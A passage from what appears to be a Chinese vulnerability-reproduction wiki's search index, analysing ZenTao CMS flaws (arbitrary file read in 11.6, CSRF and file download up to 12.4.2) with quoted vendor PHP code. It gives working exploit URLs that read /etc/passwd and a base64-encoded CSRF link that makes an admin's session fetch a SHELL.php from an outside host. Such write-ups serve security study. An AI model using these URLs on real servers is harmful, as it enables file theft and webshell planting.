$pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230**\u4ee5file\u4e3a\u6a21\u5757\u540d\u3001parseCSV\u4e3a\u65b9\u6cd5\u540d\u53bb\u8c03\u7528**\u8bfb\u53d6\u6587\u4ef6 \u8bfb\u53d6\u7684\u6587\u4ef6\u540d**$filename**\u53c2\u6570\u53ef\u63a7\uff0c\u4f8b\u5982\u8bfb\u53d6**/etc/passwd** http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] \u6ce8\u610f\u4ee5 .php .txt \u7ed3\u5c3e\u7684\u4f1a\u88ab /framework/base/router.class.php\u4e2d\u7684parsePathInfo\u65b9\u6cd5 \u8fc7\u6ee4 \u7b2c\u4e8c\u79cd\u65b9\u6cd5 \u00b6 \u67e5\u770b**module/api/moudel.php**\u4e0b\u7684**getMethod\u65b9\u6cd5** public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i <= $data->endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } \u8fd9\u91cc\u4e0e\u7b2c\u4e00\u79cd\u5927\u540c\u5c0f\u5f02\uff0c\u53ea\u662f\u8c03\u7528\u4e86\u4e0d\u540c\u6a21\u5757\u7684\u65b9\u6cd5 \u770b\u5230** fileName = dirname( fileName = dirname( filePath);**\u8fd9\u6bb5\u5219\u4e3a\u8fd4\u56de\u7684\u76ee\u5f55\u540d \u6240\u4ee5\u8bfb\u53d6**/etc/passwd**\u5219\u9700\u8981\u5199\u4e3a**/etc/passwd/1**\u6765\u7ed5\u8fc7 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1","title":"\u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u7985\u9053-116\u7248\u672c-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"","title":"\u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7985\u9053 11.6 \u7248\u672c\u4e2d\u5bf9\u7528\u6237\u63a5\u53e3\u8c03\u7528\u6743\u9650\u8fc7\u6ee4\u4e0d\u5b8c\u5584\uff0c\u5bfc\u81f4\u8c03\u7528\u63a5\u53e3\u6267\u884cSQL\u8bed\u53e5\u5bfc\u81f4SQL\u6ce8\u5165","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u7985\u9053 11.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u8fd9\u91cc\u4f7f\u7528docker\u73af\u5883\u642d\u5efa docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8084 \u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u9020\u6210\u6f0f\u6d1e\u7684\u539f\u56e0\u540c\u6837\u662f\u8c03\u7528\u63a5\u53e3\u6743\u9650\u65e0\u9650\u5236\u7684\u539f\u56e0 \u63a5\u53e3\u51fa\u73b0\u6f0f\u6d1e\u7684\u539f\u56e0\u5177\u4f53\u53c2\u8003\u53ef\u4ee5\u67e5\u770b\u4e0a\u4e00\u7bc7 \u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e \u5173\u4e8e\u6b64\u6f0f\u6d1e\u7684\u5b8c\u6574\u5206\u6790","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u7b2c\u4e00\u79cd\u65b9\u6cd5","text":"\u67e5\u770b**module/file/moudel.php**\u4e0b\u7684**parseCSV\u65b9\u6cd5** public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230**\u4ee5file\u4e3a\u6a21\u5757\u540d\u3001parseCSV\u4e3a\u65b9\u6cd5\u540d\u53bb\u8c03\u7528**\u8bfb\u53d6\u6587\u4ef6 \u8bfb\u53d6\u7684\u6587\u4ef6\u540d**$filename**\u53c2\u6570\u53ef\u63a7\uff0c\u4f8b\u5982\u8bfb\u53d6**/etc/passwd** http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] \u6ce8\u610f\u4ee5 .php .txt \u7ed3\u5c3e\u7684\u4f1a\u88ab /framework/base/router.class.php\u4e2d\u7684parsePathInfo\u65b9\u6cd5 \u8fc7\u6ee4","title":"\u7b2c\u4e00\u79cd\u65b9\u6cd5"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u7b2c\u4e8c\u79cd\u65b9\u6cd5","text":"\u67e5\u770b**module/api/moudel.php**\u4e0b\u7684**getMethod\u65b9\u6cd5** public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i <= $data->endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } \u8fd9\u91cc\u4e0e\u7b2c\u4e00\u79cd\u5927\u540c\u5c0f\u5f02\uff0c\u53ea\u662f\u8c03\u7528\u4e86\u4e0d\u540c\u6a21\u5757\u7684\u65b9\u6cd5 \u770b\u5230** fileName = dirname( fileName = dirname( filePath);**\u8fd9\u6bb5\u5219\u4e3a\u8fd4\u56de\u7684\u76ee\u5f55\u540d \u6240\u4ee5\u8bfb\u53d6**/etc/passwd**\u5219\u9700\u8981\u5199\u4e3a**/etc/passwd/1**\u6765\u7ed5\u8fc7 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1","title":"\u7b2c\u4e8c\u79cd\u65b9\u6cd5"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20CSRF%E6%BC%8F%E6%B4%9E%20CNVD-2020-68552/","text":"\u7985\u9053 \u5c0f\u4e8e12.4.2 CSRF\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u53ef\u4ee5\u9488\u5bf9\u7985\u9053\u7684\u90e8\u5206\u6a21\u5757\u5236\u9020\u6076\u610fURL\u5730\u5740\u53d1\u9001\u7ed9\u7ba1\u7406\u5458\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u4f1a\u6267\u884c\u6a21\u5757\u7684\u6076\u610f\u8bf7\u6c42,\u53ef\u7528\u4e8e\u8fdb\u884c\u9493\u9c7c\u8bf7\u6c42 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u7985\u9053 <= 12.4.2\u7248\u672c \u73af\u5883\u642d\u5efa \u00b6 \u767e\u5ea6\u4e0b12.4.2\u7684\u7985\u9053\u73af\u5883\u6309\u6b65\u9aa4\u5b89\u88c5\u4e0b\u8f7d\u5373\u53ef \u7985\u9053\u5b98\u65b9\u7f51\u7ad9 \u8c03\u7528\u63a5\u53e3\u67e5\u8be2\u7248\u672c\u4fe1\u606f http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u5229\u7528 \u7985\u9053 \u5c0f\u4e8e12.4.2 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CNVD-C-2020-121325(\u53ef\u53c2\u7167\u4e0a\u4e00\u7bc7\u6587\u7ae0) \u6765\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684URL\u5730\u5740 \u67e5\u770b**module/common/model.php**\u7684**checkPriv**\u65b9\u6cd5 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } \u8fd9\u91cc\u7684\u4ee3\u7801\u7247\u6bb5\u4e3a\u9274\u6743\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u6700\u540e\u4e00\u53e5\u4ee3\u7801 $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); \u6240\u4ee5\u5f53\u8c03\u7528\u5f53\u524d\u6743\u9650\u4e0d\u5141\u8bb8\u7684\u65b9\u6cd5\u65f6\uff0c\u4f1a\u8fdb\u884c\u8df3\u8f6c\uff0c\u5e76\u5728**$referer**\u53c2\u6570\u7f13\u5b58\u8c03\u7528\u7684\u65b9\u6cd5URL\uff0c\u5f53\u4f7f\u7528\u8fd9\u4e2a\u8df3\u8f6c\u7684\u5730\u5740\u767b\u5f55\u65f6\u5219\u4f1a\u76f4\u63a5\u8c03\u7528\u6b64\u65b9\u6cd5 URL\u5730\u5740\u6784\u9020\u8fc7\u7a0b http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php \u5c06**link\u53c2\u6570**base64\u52a0\u5bc6 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw \u5c06**referer\u53c2\u6570**\u4ee5 . \u505a\u5206\u5272base64\u52a0\u5bc6\u4e24\u8fb9\u5b57\u7b26 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= \u5c06\u8fd9\u4e2aURL\u5730\u5740\u53d1\u9001\u7ed9\u7ba1\u7406\u5458\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u5219\u4f1a\u89e6\u53d1\u6076\u610f\u6587\u4ef6\u4e0b\u8f7d","title":"\u7985\u9053 \u5c0f\u4e8e12.4.2 CSRF\u6f0f\u6d1e CNVD-2020-68552"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20CSRF%E6%BC%8F%E6%B4%9E%20CNVD-2020-68552/#\u7985\u9053-\u5c0f\u4e8e1242-csrf\u6f0f\u6d1e","text":"","title":"\u7985\u9053 \u5c0f\u4e8e12.4.2 CSRF\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20CSRF%E6%BC%8F%E6%B4%9E%20CNVD-2020-68552/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u53ef\u4ee5\u9488\u5bf9\u7985\u9053\u7684\u90e8\u5206\u6a21\u5757\u5236\u9020\u6076\u610fURL\u5730\u5740\u53d1\u9001\u7ed9\u7ba1\u7406\u5458\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u4f1a\u6267\u884c\u6a21\u5757\u7684\u6076\u610f\u8bf7\u6c42,\u53ef\u7528\u4e8e\u8fdb\u884c\u9493\u9c7c\u8bf7\u6c42","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20CSRF%E6%BC%8F%E6%B4%9E%20CNVD-2020-68552/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u7985\u9053 <= 12.4.2\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20CSRF%E6%BC%8F%E6%B4%9E%20CNVD-2020-68552/#\u73af\u5883\u642d\u5efa","text":"\u767e\u5ea6\u4e0b12.4.2\u7684\u7985\u9053\u73af\u5883\u6309\u6b65\u9aa4\u5b89\u88c5\u4e0b\u8f7d\u5373\u53ef \u7985\u9053\u5b98\u65b9\u7f51\u7ad9 \u8c03\u7528\u63a5\u53e3\u67e5\u8be2\u7248\u672c\u4fe1\u606f http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20CSRF%E6%BC%8F%E6%B4%9E%20CNVD-2020-68552/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u5229\u7528 \u7985\u9053 \u5c0f\u4e8e12.4.2 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CNVD-C-2020-121325(\u53ef\u53c2\u7167\u4e0a\u4e00\u7bc7\u6587\u7ae0) \u6765\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684URL\u5730\u5740 \u67e5\u770b**module/common/model.php**\u7684**checkPriv**\u65b9\u6cd5 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } \u8fd9\u91cc\u7684\u4ee3\u7801\u7247\u6bb5\u4e3a\u9274\u6743\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u6700\u540e\u4e00\u53e5\u4ee3\u7801 $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); \u6240\u4ee5\u5f53\u8c03\u7528\u5f53\u524d\u6743\u9650\u4e0d\u5141\u8bb8\u7684\u65b9\u6cd5\u65f6\uff0c\u4f1a\u8fdb\u884c\u8df3\u8f6c\uff0c\u5e76\u5728**$referer**\u53c2\u6570\u7f13\u5b58\u8c03\u7528\u7684\u65b9\u6cd5URL\uff0c\u5f53\u4f7f\u7528\u8fd9\u4e2a\u8df3\u8f6c\u7684\u5730\u5740\u767b\u5f55\u65f6\u5219\u4f1a\u76f4\u63a5\u8c03\u7528\u6b64\u65b9\u6cd5 URL\u5730\u5740\u6784\u9020\u8fc7\u7a0b http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php \u5c06**link\u53c2\u6570**base64\u52a0\u5bc6 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw \u5c06**referer\u53c2\u6570**\u4ee5 . \u505a\u5206\u5272base64\u52a0\u5bc6\u4e24\u8fb9\u5b57\u7b26 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= \u5c06\u8fd9\u4e2aURL\u5730\u5740\u53d1\u9001\u7ed9\u7ba1\u7406\u5458\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u5219\u4f1a\u89e6\u53d1\u6076\u610f\u6587\u4ef6\u4e0b\u8f7d","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/","text":"\u7985\u9053 \u5c0f\u4e8e12.4.2 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CNVD-C-2020-121325 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u767e\u5ea6\u4e91\u5b89\u5168\u56e2\u961f\u76d1\u6d4b\u5230\u7985\u9053\u5b98\u65b9\u53d1\u5e03\u4e86\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCNVD-C-2020-121325\uff0c\u6f0f\u6d1e\u5f71\u54cd\u7985\u9053<=12.4.2\u7248\u672c\u3002\u767b\u9646\u7ba1\u7406\u540e\u53f0\u7684\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7fopen/fread/fwrite\u65b9\u6cd5\u8bfb\u53d6\u6216\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\uff0c\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u4ee5\u8bfb\u53d6\u76ee\u6807\u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u6216\u83b7\u5f97\u7cfb\u7edf\u7ba1\u7406\u6743\u9650\u3002\u6211\u4eec\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u4e86\u590d\u73b0\u548c\u5206\u6790\uff0c\u7531\u4e8e\u9700\u8981\u767b\u5f55\u540e\u53f0\u624d\u53ef\u4ee5\u5229\u7528\uff0c\u5b9e\u9645\u98ce\u9669\u76f8\u5bf9\u8f83\u4f4e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7985\u9053\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u7985\u9053 <= 12.4.2\u7248\u672c \u73af\u5883\u642d\u5efa \u00b6 \u767e\u5ea6\u4e0b12.4.2\u7684\u7985\u9053\u73af\u5883\u6309\u6b65\u9aa4\u5b89\u88c5\u4e0b\u8f7d\u5373\u53ef \u7985\u9053\u5b98\u65b9\u7f51\u7ad9 \u8c03\u7528\u63a5\u53e3\u67e5\u8be2\u7248\u672c\u4fe1\u606f http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig \u6f0f\u6d1e\u590d\u73b0 \u00b6 [!NOTE] \u6f0f\u6d1e\u89e6\u53d1\u9700\u8981\u540e\u53f0\u6743\u9650 \u6839\u636e\u6f0f\u6d1e\u63cf\u8ff0\u67e5\u770b\u4fee\u6539\u540e\u7684\u4ee3\u7801\u7247\u6bb5 \u4fee\u6539\u524d public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } \u4fee\u6539\u540e public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } \u8fd9\u91cc\u4f20\u5165\u7684\u53c2\u6570\u4e3a\u7248\u672c\u548clink\u5730\u5740\uff0c\u7136\u540ebase64\u89e3\u7801\uff0c\u6b63\u5219\u5224\u65ad\u662f\u5426\u4e3a**http**\u6216**https**\u534f\u8bae\uff0c\u8fd9\u91cc\u7684\u6b63\u5219\u8fc7\u6ee4\u5e76\u4e0d\u5b8c\u6574\uff0c\u6240\u4ee5\u53ef\u4ee5\u7ed5\u8fc7\u7528\u4e8e\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6 \u53ef\u4ee5\u5927\u5199**http**\u6216\u8bf7\u6c42**FTP**\u6765\u7ed5\u8fc7\u6b63\u5219 \u8ddf\u8fdb\u4e00\u4e0b**parent::downloadZipPackage**\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u8ddf\u7740\u6765\u5230**zentao\\module\\client\\model.php**\u6587\u4ef6\u4e2d public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } \u53ef\u4ee5\u7b80\u5355\u770b\u5230\u8fd9\u91cc\u83b7\u53d6link\u4f20\u5165\u7684\u6587\u4ef6\u540d\uff0c\u901a\u8fc7**fopen**\u6253\u5f00\u8be5\u6587\u4ef6\uff0c\u5199\u5165\u7985\u9053\u76ee\u5f55**www/data/client/version**\u4e2d \u67e5\u770b\u4e00\u4e0b\u6709\u6ca1\u6709\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u5730\u65b9 \u627e\u5230\u4e86**download**\u65b9\u6cd5\u8c03\u7528\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u70b9\uff0c\u6240\u4ee5\u6211\u4eec\u6709\u4e24\u79cd\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6\u7684\u65b9\u6cd5 http://xxx.xxx.xxx.xxx/www/client-download-[$version\u53c2\u6570]-[base64\u52a0\u5bc6\u540e\u7684\u6076\u610f\u6587\u4ef6\u5730\u5740].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$version\u53c2\u6570]&link=[base64\u52a0\u5bc6\u540e\u7684\u6076\u610f\u6587\u4ef6\u5730\u5740] 